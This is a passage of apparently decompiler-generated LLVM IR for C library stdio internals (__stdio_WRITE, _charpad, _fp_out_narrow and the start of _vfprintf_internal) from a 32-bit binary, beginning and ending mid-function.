  %v1_804dfb6 = icmp eq i32 %v5_804df81, 0
  store i32 %v4_804dfae, i32* %edx.global-to-local, align 4
  br i1 %v1_804dfb6, label %dec_label_pc_804dfd2, label %dec_label_pc_804dfcb

dec_label_pc_804dfcb:                             ; preds = %entry
  %stack_var_-80.0 = inttoptr i32 %v0_804df84 to i8*
  store i8 0, i8* %stack_var_-80.0, align 1
  %v0_804dfd5.pre = load i32, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_804dfd2

dec_label_pc_804dfd2:                             ; preds = %entry, %dec_label_pc_804dfcb
  %v0_804dfd5 = phi i32 [ %v4_804dfae, %entry ], [ %v0_804dfd5.pre, %dec_label_pc_804dfcb ]
  %v2_804dfd7 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_804dfd7, i32* @ebx, align 4
  store i32 %v0_804df2e, i32* @esi, align 4
  store i32 %v0_804df2d, i32* @edi, align 4
  store i32 %v0_804df2c, i32* @ebp, align 4
  ret i32 %v0_804dfd5

; uselistorder directives
  uselistorder i32 %v1_804df7f, { 1, 0 }
  uselistorder i32 %v1_804df5c, { 1, 0 }
  uselistorder i32 (i32)* @__stdio_init_mutex, { 3, 2, 1, 0, 4 }
  uselistorder label %dec_label_pc_804dfd2, { 1, 0 }
}

define i32 @__stdio_WRITE(i16* %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %ebp.global-to-local = alloca i32, align 4
  %esi.global-to-local = alloca i32, align 4
  %zf.global-to-local = alloca i1, align 1
  %stack_var_-28 = alloca i32, align 4
  %v0_804dfdd = load i32, i32* @edi, align 4
  %v0_804dfdf = load i32, i32* @ebx, align 4
  %v15_804dfe0 = ptrtoint i32* %stack_var_-28 to i32
  %v4_804dfe3 = ptrtoint i16* %arg1 to i32
  store i32 %v4_804dfe3, i32* %ebp.global-to-local, align 4
  store i32 %arg2, i32* @edi, align 4
  store i32 %arg3, i32* @ebx, align 4
  %v1_804dfef4 = icmp eq i32 %arg3, 0
  store i1 %v1_804dfef4, i1* %zf.global-to-local, align 1
  br i1 %v1_804dfef4, label %dec_label_pc_804e050, label %dec_label_pc_804dff4.lr.ph

dec_label_pc_804dff4.lr.ph:                       ; preds = %entry
  br label %dec_label_pc_804dff4

dec_label_pc_804dff4:                             ; preds = %dec_label_pc_804e010.dec_label_pc_804dff4_crit_edge, %dec_label_pc_804dff4.lr.ph
  %v0_804e001 = phi i32 [ %v4_804dfe3, %dec_label_pc_804dff4.lr.ph ], [ %v0_804e001.pre, %dec_label_pc_804e010.dec_label_pc_804dff4_crit_edge ]
  %v0_804e000 = phi i32 [ %arg2, %dec_label_pc_804dff4.lr.ph ], [ %v2_804e012, %dec_label_pc_804e010.dec_label_pc_804dff4_crit_edge ]
  %v0_804dffc.in = phi i32 [ %arg3, %dec_label_pc_804dff4.lr.ph ], [ %v2_804e010, %dec_label_pc_804e010.dec_label_pc_804dff4_crit_edge ]
  %v4_804dffc = phi i32 [ %arg3, %dec_label_pc_804dff4.lr.ph ], [ %v2_804e010, %dec_label_pc_804e010.dec_label_pc_804dff4_crit_edge ]
  %v0_804dffc = icmp slt i32 %v0_804dffc.in, 0
  store i32 %v4_804dffc, i32* %esi.global-to-local, align 4
  %v2_804dffc = icmp eq i1 %v0_804dffc, false
  %v5_804dffc = select i1 %v2_804dffc, i32 %v4_804dffc, i32 2147483647
  store i32 %v5_804dffc, i32* %eax.global-to-local, align 4
  %v1_804e001 = add i32 %v0_804e001, 4
  %v2_804e001 = inttoptr i32 %v1_804e001 to i32*
  %v3_804e001 = load i32, i32* %v2_804e001, align 4
  %tmp36 = inttoptr i32 %v0_804e000 to i32*
  %v5_804e004 = call i32 @__libc_write(i32 %v3_804e001, i32* %tmp36, i32 %v5_804dffc)
  store i32 %v5_804e004, i32* %eax.global-to-local, align 4
  %v1_804e00c = icmp eq i32 %v5_804e004, 0
  store i1 %v1_804e00c, i1* %zf.global-to-local, align 1
  %v2_804e00c = icmp slt i32 %v5_804e004, 0
  br i1 %v2_804e00c, label %dec_label_pc_804e016, label %dec_label_pc_804e010

dec_label_pc_804e010:                             ; preds = %dec_label_pc_804dff4
  %v0_804e010 = load i32, i32* @ebx, align 4
  %v2_804e010 = sub i32 %v0_804e010, %v5_804e004
  %v12_804e010 = icmp eq i32 %v2_804e010, 0
  store i32 %v2_804e010, i32* @ebx, align 4
  %v0_804e012 = load i32, i32* @edi, align 4
  %v2_804e012 = add i32 %v0_804e012, %v5_804e004
  store i32 %v2_804e012, i32* @edi, align 4
  store i1 %v12_804e010, i1* %zf.global-to-local, align 1
  br i1 %v12_804e010, label %dec_label_pc_804e050, label %dec_label_pc_804e010.dec_label_pc_804dff4_crit_edge

dec_label_pc_804e010.dec_label_pc_804dff4_crit_edge: ; preds = %dec_label_pc_804e010
  %v0_804e001.pre = load i32, i32* %ebp.global-to-local, align 4
  br label %dec_label_pc_804dff4

dec_label_pc_804e016:                             ; preds = %dec_label_pc_804dff4
  %v0_804e016 = load i32, i32* %ebp.global-to-local, align 4
  %v1_804e016 = inttoptr i32 %v0_804e016 to i32*
  %v2_804e016 = load i32, i32* %v1_804e016, align 4
  store i32 %v2_804e016, i32* %eax.global-to-local, align 4
  %v1_804e019 = add i32 %v0_804e016, 8
  %v2_804e019 = inttoptr i32 %v1_804e019 to i32*
  %v3_804e019 = load i32, i32* %v2_804e019, align 4
  store i32 %v3_804e019, i32* @edx, align 4
  %v1_804e01c = or i32 %v2_804e016, 8
  store i32 %v1_804e01c, i32* %eax.global-to-local, align 4
  %v1_804e01f = trunc i32 %v1_804e01c to i16
  %v3_804e01f = inttoptr i32 %v0_804e016 to i16*
  store i16 %v1_804e01f, i16* %v3_804e01f, align 2
  %v0_804e023 = load i32, i32* %ebp.global-to-local, align 4
  %v1_804e023 = add i32 %v0_804e023, 12
  %v2_804e023 = inttoptr i32 %v1_804e023 to i32*
  %v3_804e023 = load i32, i32* %v2_804e023, align 4
  %v1_804e026 = load i32, i32* @edx, align 4
  %v2_804e026 = sub i32 %v3_804e023, %v1_804e026
  %v12_804e026 = icmp eq i32 %v2_804e026, 0
  store i1 %v12_804e026, i1* %zf.global-to-local, align 1
  store i32 %v2_804e026, i32* %eax.global-to-local, align 4
  %v4_804e04c.pre = load i32, i32* @ebx, align 4
  br i1 %v12_804e026, label %dec_label_pc_804e04c, label %dec_label_pc_804e02a

dec_label_pc_804e02a:                             ; preds = %dec_label_pc_804e016
  %v12_804e02a = icmp eq i32 %v2_804e026, %v4_804e04c.pre
  store i1 %v12_804e02a, i1* %zf.global-to-local, align 1
  %tmp = icmp ule i32 %v2_804e026, %v4_804e04c.pre
  %v3_804e02c = load i32, i32* %esi.global-to-local, align 4
  %v5_804e02c = select i1 %tmp, i32 %v2_804e026, i32 %v3_804e02c
  store i32 %v5_804e02c, i32* %esi.global-to-local, align 4
  %v0_804e02f.pre = load i32, i32* @edi, align 4
  br label %dec_label_pc_804e02f

dec_label_pc_804e02f:                             ; preds = %dec_label_pc_804e041, %dec_label_pc_804e02a
  %v2_804e033 = phi i32 [ %v1_804e03d, %dec_label_pc_804e041 ], [ %v1_804e026, %dec_label_pc_804e02a ]
  %v4_804e02f = phi i32 [ %v4_804e02f.pre, %dec_label_pc_804e041 ], [ %v2_804e026, %dec_label_pc_804e02a ]
  %v0_804e02f = phi i32 [ %v1_804e041, %dec_label_pc_804e041 ], [ %v0_804e02f.pre, %dec_label_pc_804e02a ]
  %v1_804e02f = inttoptr i32 %v0_804e02f to i8*
  %v2_804e02f = load i8, i8* %v1_804e02f, align 1
  %v3_804e02f = zext i8 %v2_804e02f to i32
  %v5_804e02f = and i32 %v4_804e02f, -256
  %v6_804e02f = or i32 %v3_804e02f, %v5_804e02f
  store i32 %v6_804e02f, i32* %eax.global-to-local, align 4
  %v10_804e031 = icmp eq i8 %v2_804e02f, 10
  store i1 %v10_804e031, i1* %zf.global-to-local, align 1
  %v3_804e033 = inttoptr i32 %v2_804e033 to i8*
  store i8 %v2_804e02f, i8* %v3_804e033, align 1
  %v0_804e035 = load i1, i1* %zf.global-to-local, align 1
  %v1_804e035 = icmp eq i1 %v0_804e035, false
  br i1 %v1_804e035, label %dec_label_pc_804e03d, label %dec_label_pc_804e037

dec_label_pc_804e037:                             ; preds = %dec_label_pc_804e02f
  %v0_804e037 = load i32, i32* %ebp.global-to-local, align 4
  %v1_804e037 = add i32 %v0_804e037, 1
  %v2_804e037 = inttoptr i32 %v1_804e037 to i8*
  %v3_804e037 = load i8, i8* %v2_804e037, align 1
  %v4_804e037 = urem i8 %v3_804e037, 2
  %v5_804e037 = icmp eq i8 %v4_804e037, 0
  store i1 %v5_804e037, i1* %zf.global-to-local, align 1
  %v1_804e03b = icmp eq i1 %v5_804e037, false
  br i1 %v1_804e03b, label %dec_label_pc_804e037.dec_label_pc_804e044_crit_edge, label %dec_label_pc_804e03d

dec_label_pc_804e037.dec_label_pc_804e044_crit_edge: ; preds = %dec_label_pc_804e037
  %v0_804e044.pre = load i32, i32* @edx, align 4
  br label %dec_label_pc_804e044

dec_label_pc_804e03d:                             ; preds = %dec_label_pc_804e037, %dec_label_pc_804e02f
  %v0_804e03d = load i32, i32* @edx, align 4
  %v1_804e03d = add i32 %v0_804e03d, 1
  store i32 %v1_804e03d, i32* @edx, align 4
  %v0_804e03e = load i32, i32* %esi.global-to-local, align 4
  %v1_804e03e = add i32 %v0_804e03e, -1
  %v8_804e03e = icmp eq i32 %v1_804e03e, 0
  store i1 %v8_804e03e, i1* %zf.global-to-local, align 1
  store i32 %v1_804e03e, i32* %esi.global-to-local, align 4
  br i1 %v8_804e03e, label %dec_label_pc_804e03d.dec_label_pc_804e044_crit_edge, label %dec_label_pc_804e041

dec_label_pc_804e03d.dec_label_pc_804e044_crit_edge: ; preds = %dec_label_pc_804e03d
  %v1_804e044.pre = load i32, i32* %ebp.global-to-local, align 4
  br label %dec_label_pc_804e044

dec_label_pc_804e041:                             ; preds = %dec_label_pc_804e03d
  %v0_804e041 = load i32, i32* @edi, align 4
  %v1_804e041 = add i32 %v0_804e041, 1
  %v8_804e041 = icmp eq i32 %v1_804e041, 0
  store i1 %v8_804e041, i1* %zf.global-to-local, align 1
  store i32 %v1_804e041, i32* @edi, align 4
  %v4_804e02f.pre = load i32, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804e02f

dec_label_pc_804e044:                             ; preds = %dec_label_pc_804e03d.dec_label_pc_804e044_crit_edge, %dec_label_pc_804e037.dec_label_pc_804e044_crit_edge
  %v1_804e044 = phi i32 [ %v0_804e037, %dec_label_pc_804e037.dec_label_pc_804e044_crit_edge ], [ %v1_804e044.pre, %dec_label_pc_804e03d.dec_label_pc_804e044_crit_edge ]
  %v0_804e044 = phi i32 [ %v0_804e044.pre, %dec_label_pc_804e037.dec_label_pc_804e044_crit_edge ], [ %v1_804e03d, %dec_label_pc_804e03d.dec_label_pc_804e044_crit_edge ]
  %v2_804e044 = add i32 %v1_804e044, 16
  %v3_804e044 = inttoptr i32 %v2_804e044 to i32*
  store i32 %v0_804e044, i32* %v3_804e044, align 4
  %v0_804e047 = load i32, i32* @edx, align 4
  %v1_804e047 = load i32, i32* %ebp.global-to-local, align 4
  %v2_804e047 = add i32 %v1_804e047, 8
  %v3_804e047 = inttoptr i32 %v2_804e047 to i32*
  %v4_804e047 = load i32, i32* %v3_804e047, align 4
  %v5_804e047 = sub i32 %v0_804e047, %v4_804e047
  store i32 %v5_804e047, i32* @edx, align 4
  %v0_804e04a = load i32, i32* @ebx, align 4
  %v2_804e04a = sub i32 %v0_804e04a, %v5_804e047
  %v12_804e04a = icmp eq i32 %v2_804e04a, 0
  store i1 %v12_804e04a, i1* %zf.global-to-local, align 1
  br label %dec_label_pc_804e04c

dec_label_pc_804e04c:                             ; preds = %dec_label_pc_804e016, %dec_label_pc_804e044
  %v4_804e04c = phi i32 [ %v2_804e04a, %dec_label_pc_804e044 ], [ %v4_804e04c.pre, %dec_label_pc_804e016 ]
  %v5_804e04c = sub i32 %arg3, %v4_804e04c
  %v15_804e04c = icmp eq i32 %v5_804e04c, 0
  store i1 %v15_804e04c, i1* %zf.global-to-local, align 1
  %v0_804e054.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_804e050

dec_label_pc_804e050:                             ; preds = %dec_label_pc_804e010, %entry, %dec_label_pc_804e04c
  %v0_804e054 = phi i32 [ %v0_804e054.pre, %dec_label_pc_804e04c ], [ %v15_804dfe0, %entry ], [ %v15_804dfe0, %dec_label_pc_804e010 ]
  %stack_var_12.0 = phi i32 [ %v5_804e04c, %dec_label_pc_804e04c ], [ 0, %entry ], [ %arg3, %dec_label_pc_804e010 ]
  store i32 %stack_var_12.0, i32* %eax.global-to-local, align 4
  %v9_804e054 = icmp eq i32 %v0_804e054, -12
  store i1 %v9_804e054, i1* %zf.global-to-local, align 1
  store i32 %v0_804dfdf, i32* @ebx, align 4
  store i32 %v0_804dfdd, i32* @edi, align 4
  ret i32 %stack_var_12.0

; uselistorder directives
  uselistorder i32 %stack_var_12.0, { 1, 0 }
  uselistorder i32 %v1_804e041, { 1, 2, 0 }
  uselistorder i32 %v1_804e03e, { 1, 0 }
  uselistorder i32 %v1_804e03d, { 0, 2, 1 }
  uselistorder i8 %v2_804e02f, { 1, 0, 2 }
  uselistorder i32 %v4_804e04c.pre, { 2, 0, 1 }
  uselistorder i32 %v2_804e026, { 2, 3, 0, 1, 4, 5 }
  uselistorder i32 %v2_804e012, { 1, 0 }
  uselistorder i32 %v2_804e010, { 2, 3, 0, 1 }
  uselistorder i32 %v5_804e004, { 0, 3, 1, 2, 4 }
  uselistorder i1* %zf.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 12, 11, 0 }
  uselistorder i32* %ebp.global-to-local, { 2, 0, 3, 4, 5, 1, 6 }
  uselistorder i32 (i32, i32*, i32)* @__libc_write, { 1, 0 }
  uselistorder i32 %arg3, { 1, 4, 2, 0, 3, 5 }
  uselistorder label %dec_label_pc_804e050, { 2, 0, 1 }
  uselistorder label %dec_label_pc_804e04c, { 1, 0 }
}

define i32 @_charpad() local_unnamed_addr {
entry:
  %stack_var_-13 = alloca i32, align 4
  %v0_804e05c = load i32, i32* @edi, align 4
  %v0_804e05d = load i32, i32* @eax, align 4
  store i32 %v0_804e05d, i32* @edi, align 4
  %v0_804e05f = load i32, i32* @esi, align 4
  %v0_804e060 = load i32, i32* @ecx, align 4
  store i32 %v0_804e060, i32* @esi, align 4
  %v0_804e062 = load i32, i32* @ebx, align 4
  store i32 %v0_804e060, i32* @ebx, align 4
  %v0_804e068 = load i32, i32* @edx, align 4
  store i32 %v0_804e068, i32* %stack_var_-13, align 4
  %v1_804e06f2 = icmp eq i32 %v0_804e060, 0
  br i1 %v1_804e06f2, label %dec_label_pc_804e087, label %dec_label_pc_804e073.lr.ph

dec_label_pc_804e073.lr.ph:                       ; preds = %entry
  %v2_804e073 = ptrtoint i32* %stack_var_-13 to i32
  br label %dec_label_pc_804e073

dec_label_pc_804e06e:                             ; preds = %dec_label_pc_804e073
  %v1_804e06e = add i32 %v0_804e06e, -1
  %v8_804e06e = icmp eq i32 %v1_804e06e, 0
  store i32 %v1_804e06e, i32* @ebx, align 4
  br i1 %v8_804e06e, label %dec_label_pc_804e087.loopexit, label %dec_label_pc_804e06e.dec_label_pc_804e073_crit_edge

dec_label_pc_804e06e.dec_label_pc_804e073_crit_edge: ; preds = %dec_label_pc_804e06e
  %v0_804e077.pre = load i32, i32* @edx, align 4
  %v0_804e078.pre = load i32, i32* @edi, align 4
  br label %dec_label_pc_804e073

dec_label_pc_804e073:                             ; preds = %dec_label_pc_804e06e.dec_label_pc_804e073_crit_edge, %dec_label_pc_804e073.lr.ph
  %v0_804e078 = phi i32 [ %v0_804e078.pre, %dec_label_pc_804e06e.dec_label_pc_804e073_crit_edge ], [ %v0_804e05d, %dec_label_pc_804e073.lr.ph ]
  %v0_804e077 = phi i32 [ %v0_804e077.pre, %dec_label_pc_804e06e.dec_label_pc_804e073_crit_edge ], [ %v0_804e068, %dec_label_pc_804e073.lr.ph ]
  %v4_804e07c = call i32 @__stdio_fwrite(i32 %v2_804e073, i32 1, i32 %v0_804e078, i32 %v0_804e077)
  %v8_804e084 = icmp eq i32 %v4_804e07c, 1
  %v0_804e06e = load i32, i32* @ebx, align 4
  br i1 %v8_804e084, label %dec_label_pc_804e06e, label %dec_label_pc_804e087.loopexit

dec_label_pc_804e087.loopexit:                    ; preds = %dec_label_pc_804e06e, %dec_label_pc_804e073
  %v1_804e08a.ph = phi i32 [ %v0_804e06e, %dec_label_pc_804e073 ], [ 0, %dec_label_pc_804e06e ]
  %v0_804e08a.pre = load i32, i32* @esi, align 4
  br label %dec_label_pc_804e087

dec_label_pc_804e087:                             ; preds = %dec_label_pc_804e087.loopexit, %entry
  %v0_804e08a = phi i32 [ 0, %entry ], [ %v0_804e08a.pre, %dec_label_pc_804e087.loopexit ]
  %v1_804e08a = phi i32 [ 0, %entry ], [ %v1_804e08a.ph, %dec_label_pc_804e087.loopexit ]
  %v2_804e08a = sub i32 %v0_804e08a, %v1_804e08a
  store i32 %v0_804e062, i32* @ebx, align 4
  store i32 %v0_804e05f, i32* @esi, align 4
  store i32 %v0_804e05c, i32* @edi, align 4
  ret i32 %v2_804e08a

; uselistorder directives
  uselistorder i32 %v1_804e06e, { 1, 0 }
  uselistorder i32* %stack_var_-13, { 1, 0 }
  uselistorder label %dec_label_pc_804e087.loopexit, { 1, 0 }
}

define i32 @_fp_out_narrow(i32 %arg1, i32 %arg2, i32 %arg3, i8* %arg4) local_unnamed_addr {
entry:
  store i32 0, i32* @ebp, align 4
  store i32 %arg2, i32* @edi, align 4
  store i32 %arg3, i32* @ebx, align 4
  %v3_804e0a5 = trunc i32 %arg2 to i8
  %v5_804e0a5 = icmp slt i8 %v3_804e0a5, 0
  %v1_804e0a7 = icmp eq i1 %v5_804e0a5, false
  %tmp21 = ptrtoint i8* %arg4 to i32
  br i1 %v1_804e0a7, label %dec_label_pc_804e0d8, label %dec_label_pc_804e0a9

dec_label_pc_804e0a9:                             ; preds = %entry
  %v3_804e0b0 = call i32 @strlen(i8* %arg4)
  %v0_804e0b8 = load i32, i32* @ebx, align 4
  %v2_804e0b8 = sub i32 %v0_804e0b8, %v3_804e0b0
  store i32 %v2_804e0b8, i32* @ebx, align 4
  store i32 %v3_804e0b0, i32* @esi, align 4
  %tmp23 = icmp slt i32 %v2_804e0b8, 1
  br i1 %tmp23, label %dec_label_pc_804e0d6, label %dec_label_pc_804e0c0

dec_label_pc_804e0c0:                             ; preds = %dec_label_pc_804e0a9
  store i32 %arg1, i32* @eax, align 4
  %v0_804e0c4 = load i32, i32* @edi, align 4
  %v1_804e0c4 = urem i32 %v0_804e0c4, 128
  store i32 %v1_804e0c4, i32* @edi, align 4
  store i32 %v2_804e0b8, i32* @ecx, align 4
  store i32 %v1_804e0c4, i32* @edx, align 4
  %v0_804e0cb = call i32 @_charpad()
  %v12_804e0d0 = icmp eq i32 %v0_804e0cb, %v2_804e0b8
  store i32 %v0_804e0cb, i32* @ebp, align 4
  %v1_804e0d4 = icmp eq i1 %v12_804e0d0, false
  br i1 %v1_804e0d4, label %dec_label_pc_804e0f2, label %dec_label_pc_804e0c0.dec_label_pc_804e0d6_crit_edge

dec_label_pc_804e0c0.dec_label_pc_804e0d6_crit_edge: ; preds = %dec_label_pc_804e0c0
  %v0_804e0d6.pre = load i32, i32* @esi, align 4
  br label %dec_label_pc_804e0d6

dec_label_pc_804e0d6:                             ; preds = %dec_label_pc_804e0c0.dec_label_pc_804e0d6_crit_edge, %dec_label_pc_804e0a9
  %v0_804e0d6 = phi i32 [ %v0_804e0d6.pre, %dec_label_pc_804e0c0.dec_label_pc_804e0d6_crit_edge ], [ %v3_804e0b0, %dec_label_pc_804e0a9 ]
  store i32 %v0_804e0d6, i32* @ebx, align 4
  br label %dec_label_pc_804e0d8

dec_label_pc_804e0d8:                             ; preds = %entry, %dec_label_pc_804e0d6
  %v0_804e0e3 = phi i32 [ %arg3, %entry ], [ %v0_804e0d6, %dec_label_pc_804e0d6 ]
  %tmp24 = icmp slt i32 %v0_804e0e3, 1
  br i1 %tmp24, label %dec_label_pc_804e0f0, label %dec_label_pc_804e0de

dec_label_pc_804e0de:                             ; preds = %dec_label_pc_804e0d8
  %v0_804e0de = load i32, i32* @ecx, align 4
  %v5_804e0e8 = call i32 @__stdio_fwrite(i32 %tmp21, i32 %v0_804e0e3, i32 %arg1, i32 %v0_804e0de)
  br label %dec_label_pc_804e0f0

dec_label_pc_804e0f0:                             ; preds = %dec_label_pc_804e0d8, %dec_label_pc_804e0de
  %v1_804e0f0 = phi i32 [ 0, %dec_label_pc_804e0d8 ], [ %v5_804e0e8, %dec_label_pc_804e0de ]
  %v0_804e0f0 = load i32, i32* @ebp, align 4
  %v2_804e0f0 = add i32 %v0_804e0f0, %v1_804e0f0
  br label %dec_label_pc_804e0f2

dec_label_pc_804e0f2:                             ; preds = %dec_label_pc_804e0c0, %dec_label_pc_804e0f0
  %v0_804e0f5 = phi i32 [ %v0_804e0cb, %dec_label_pc_804e0c0 ], [ %v2_804e0f0, %dec_label_pc_804e0f0 ]
  ret i32 %v0_804e0f5

; uselistorder directives
  uselistorder i32 %v0_804e0e3, { 1, 0 }
  uselistorder i32 %v0_804e0cb, { 1, 2, 0 }
  uselistorder i32 %v1_804e0c4, { 1, 0 }
  uselistorder i32 %v2_804e0b8, { 0, 2, 1, 3 }
  uselistorder i32 %arg2, { 1, 0 }
  uselistorder label %dec_label_pc_804e0f2, { 1, 0 }
  uselistorder label %dec_label_pc_804e0f0, { 1, 0 }
  uselistorder label %dec_label_pc_804e0d8, { 1, 0 }
}

define i32 @_vfprintf_internal(i32 %arg1, i8* %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %ecx.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %sf.global-to-local = alloca i1, align 1
  %st0.global-to-local = alloca x86_fp80, align 4
  %stack_var_-364 = alloca i32, align 4
  %stack_var_-348 = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v0_804e0ff = load i32, i32* @ebx, align 4
  store i32 %v0_804e0ff, i32* %stack_var_-16, align 4
  %v4_804e0ff = ptrtoint i32* %stack_var_-16 to i32
  %v1_804e100 = add i32 %v4_804e0ff, -356
  %v10_804e100 = icmp slt i32 %v1_804e100, 0
  store i1 %v10_804e100, i1* %sf.global-to-local, align 1
  %v4_804e106 = ptrtoint i8* %arg2 to i32
  store i32 %v4_804e106, i32* @ebx, align 4
  %v2_804e10e = ptrtoint i32* %stack_var_-348 to i32
  store i32 %v2_804e10e, i32* @esi, align 4
  %v5_804e113 = call i32 @_ppfs_init(i32* nonnull %stack_var_-348, i32 %v4_804e106)
  store i32 %v5_804e113, i32* %eax.global-to-local, align 4
  %v2_804e11b = icmp slt i32 %v5_804e113, 0
  store i1 %v2_804e11b, i1* %sf.global-to-local, align 1
  %v1_804e11d = icmp eq i1 %v2_804e11b, false
  br i1 %v1_804e11d, label %dec_label_pc_804e15d, label %dec_label_pc_804e11f

dec_label_pc_804e11f:                             ; preds = %entry
  %v12_804e118 = ptrtoint i32* %stack_var_-364 to i32
  %v3_804e11f = load i32, i32* %stack_var_-348, align 4
  store i32 %v3_804e11f, i32* @ebx, align 4
  %v1_804e123 = add i32 %v12_804e118, -12
  %v10_804e123 = icmp slt i32 %v1_804e123, 0
  store i1 %v10_804e123, i1* %sf.global-to-local, align 1
  %v5_804e126 = inttoptr i32 %v3_804e11f to i8*
  %v3_804e127 = call i32 @strlen(i8* %v5_804e126)
  store i32 %v3_804e127, i32* %eax.global-to-local, align 4
  store i32 -1, i32* %stack_var_-364, align 4
  %v1_804e136 = icmp eq i32 %v3_804e127, 0
  %v2_804e136 = icmp slt i32 %v3_804e127, 0
  store i1 %v2_804e136, i1* %sf.global-to-local, align 1
  br i1 %v1_804e136, label %dec_label_pc_804e6a6, label %dec_label_pc_804e13e

dec_label_pc_804e13e:                             ; preds = %dec_label_pc_804e11f
  %v0_804e13e = load i32, i32* @edx, align 4
  %v0_804e147 = load i32, i32* @ebx, align 4
  %v6_804e148 = call i32 @__stdio_fwrite(i32 %v0_804e147, i32 %v3_804e127, i32 %arg1, i32 %v0_804e13e)
  store i32 %v6_804e148, i32* %eax.global-to-local, align 4
  store i32 -1, i32* %stack_var_-364, align 4
  %v0_804e155 = load i32, i32* @esp, align 4
  %v1_804e155 = add i32 %v0_804e155, 16
  %v7_804e155 = icmp slt i32 %v1_804e155, 0
  store i1 %v7_804e155, i1* %sf.global-to-local, align 1
  br label %dec_label_pc_804e6a6

dec_label_pc_804e15d:                             ; preds = %entry
  %v6_804e167 = call i32 @_ppfs_prepargs(i32 %v2_804e10e, i32 %arg3, i32 %v5_804e113, i32 %v5_804e113)
  store i32 %v6_804e167, i32* %eax.global-to-local, align 4
  %v0_804e16c = load i32, i32* @ebx, align 4
  store i32 %v0_804e16c, i32* %edx.global-to-local, align 4
  store i32 0, i32* %stack_var_-364, align 4
  %v0_804e176 = load i32, i32* @esp, align 4
  %v1_804e176 = add i32 %v0_804e176, 16
  %v7_804e176 = icmp slt i32 %v1_804e176, 0
  store i1 %v7_804e176, i1* %sf.global-to-local, align 1
  br label %dec_label_pc_804e17c

dec_label_pc_804e17b:                             ; preds = %dec_label_pc_804e182
  %v1_804e17b = add i32 %v0_804e18a, 1
  %v9_804e17b = icmp slt i32 %v1_804e17b, 0
  store i1 %v9_804e17b, i1* %sf.global-to-local, align 1
  store i32 %v1_804e17b, i32* @ebx, align 4
  br label %dec_label_pc_804e17c.backedge

dec_label_pc_804e17c.backedge:                    ; preds = %dec_label_pc_804e17b, %dec_label_pc_804e68c, %dec_label_pc_804e697
  %v1_804e18620 = phi i32 [ %v1_804e18e, %dec_label_pc_804e17b ], [ %v3_804e68c, %dec_label_pc_804e68c ], [ %v1_804e1ba, %dec_label_pc_804e697 ]
  %v0_804e17c18 = phi i32 [ %v1_804e17b, %dec_label_pc_804e17b ], [ %v3_804e68c, %dec_label_pc_804e68c ], [ %v1_804e697, %dec_label_pc_804e697 ]
  %v4_804e17c.pre = load i32, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804e17c

dec_label_pc_804e17c:                             ; preds = %dec_label_pc_804e17c.backedge, %dec_label_pc_804e15d
  %v1_804e18e = phi i32 [ %v1_804e18620, %dec_label_pc_804e17c.backedge ], [ %v0_804e16c, %dec_label_pc_804e15d ]
  %v0_804e18a = phi i32 [ %v0_804e17c18, %dec_label_pc_804e17c.backedge ], [ %v0_804e16c, %dec_label_pc_804e15d ]
  %v4_804e17c = phi i32 [ %v4_804e17c.pre, %dec_label_pc_804e17c.backedge ], [ %v6_804e167, %dec_label_pc_804e15d ]
  %v1_804e17c = inttoptr i32 %v0_804e18a to i8*
  %v2_804e17c = load i8, i8* %v1_804e17c, align 1
  %v3_804e17c = zext i8 %v2_804e17c to i32
  %v5_804e17c = and i32 %v4_804e17c, -256
  %v6_804e17c = or i32 %v3_804e17c, %v5_804e17c
  store i32 %v6_804e17c, i32* %eax.global-to-local, align 4
  %v4_804e17e = icmp eq i8 %v2_804e17c, 0
  %v5_804e17e = icmp slt i8 %v2_804e17c, 0
  store i1 %v5_804e17e, i1* %sf.global-to-local, align 1
  br i1 %v4_804e17e, label %dec_label_pc_804e186, label %dec_label_pc_804e182

dec_label_pc_804e182:                             ; preds = %dec_label_pc_804e17c
  %v2_804e182 = add i8 %v2_804e17c, -37
  %v10_804e182 = icmp eq i8 %v2_804e182, 0
  %v11_804e182 = icmp slt i8 %v2_804e182, 0
  store i1 %v11_804e182, i1* %sf.global-to-local, align 1
  %v1_804e184 = icmp eq i1 %v10_804e182, false
  br i1 %v1_804e184, label %dec_label_pc_804e17b, label %dec_label_pc_804e186

dec_label_pc_804e186:                             ; preds = %dec_label_pc_804e182, %dec_label_pc_804e17c
  %v2_804e186 = sub i32 %v0_804e18a, %v1_804e18e
  %v12_804e186 = icmp eq i32 %v2_804e186, 0
  %v13_804e186 = icmp slt i32 %v2_804e186, 0
  store i1 %v13_804e186, i1* %sf.global-to-local, align 1
  br i1 %v12_804e186, label %dec_label_pc_804e1b1, label %dec_label_pc_804e18a

dec_label_pc_804e18a:                             ; preds = %dec_label_pc_804e186
  store i32 0, i32* %eax.global-to-local, align 4
  store i32 %v2_804e186, i32* @esi, align 4
  store i1 %v13_804e186, i1* %sf.global-to-local, align 1
  %tmp65 = icmp slt i32 %v2_804e186, 1
  br i1 %tmp65, label %dec_label_pc_804e1a6, label %dec_label_pc_804e194

dec_label_pc_804e194:                             ; preds = %dec_label_pc_804e18a
  %v0_804e194 = load i32, i32* @ebp, align 4
  %v1_804e194 = load i32, i32* @esp, align 4
  %v2_804e194 = add i32 %v1_804e194, -4
  %v3_804e194 = inttoptr i32 %v2_804e194 to i32*
  store i32 %v0_804e194, i32* %v3_804e194, align 4
  %v1_804e195 = add i32 %v1_804e194, 368
  %v2_804e195 = inttoptr i32 %v1_804e195 to i32*
  %v3_804e195 = load i32, i32* %v2_804e195, align 4
  %v5_804e195 = add i32 %v1_804e194, -8
  %v6_804e195 = inttoptr i32 %v5_804e195 to i32*
  store i32 %v3_804e195, i32* %v6_804e195, align 4
  %v0_804e19c = load i32, i32* @esi, align 4
  %v2_804e19c = add i32 %v1_804e194, -12
  %v3_804e19c = inttoptr i32 %v2_804e19c to i32*
  store i32 %v0_804e19c, i32* %v3_804e19c, align 4
  %v0_804e19d = load i32, i32* %edx.global-to-local, align 4
  %v2_804e19d = add i32 %v1_804e194, -16
